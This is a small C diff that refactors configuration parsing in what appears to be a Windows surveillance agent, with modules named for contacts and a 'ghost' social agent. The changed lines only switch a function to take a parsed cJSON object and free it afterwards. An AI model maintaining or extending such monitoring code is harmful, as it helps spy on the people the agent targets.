@@ -56,7 +56,7 @@ extern void PM_ContactsRegister();
 extern void PM_SocialAgentRegister();
 
 typedef void (WINAPI *conf_callback_t)(cJSON*, DWORD counter);
-extern BOOL HM_ParseConfSection(char *conf, const char *section, conf_callback_t call_back);
+extern BOOL HM_ParseConfSection(cJSON *conf, const char *section, conf_callback_t call_back);
 
 void AM_SuspendRestart(DWORD);
 
@@ -502,7 +502,9 @@ void UpdateAgentConf()
 {
 	char *conf_json = HM_ReadClearConf(shared.H4_CONF_FILE);
 	if (conf_json) {
-		HM_ParseConfSection(conf_json, "modules", &ParseModules);
+		cJSON* root = cJSON_Parse(conf_json);
+		HM_ParseConfSection(root, "modules", &ParseModules);
+		cJSON_Delete(root);
 		// Inizializza l'agente "fantasma" social
 		AM_MonitorInit(AM_GetAgentTag("social"), NULL);
 	}
